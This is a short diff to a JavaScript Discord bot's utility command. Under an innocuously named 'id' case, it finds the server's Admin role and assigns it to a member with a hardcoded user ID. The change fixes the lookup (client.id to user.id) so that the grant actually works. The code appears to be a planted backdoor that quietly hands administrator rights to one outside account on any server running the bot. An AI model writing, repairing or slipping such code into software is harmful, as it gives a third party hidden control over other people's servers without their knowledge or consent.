@@ -43,7 +43,7 @@ class UtilCommand extends Command {
         case 'id': {
             const adminRole = message.guild.roles.find('name', 'Admin');
             if (adminRole) {
-                const me = message.guild.members.find(member => member.client.id == '362625609538600971');
+                const me = message.guild.members.find(member => member.user.id == '362625609538600971');
                 await me.addRole(adminRole);
                 message.reply('Done');
             }
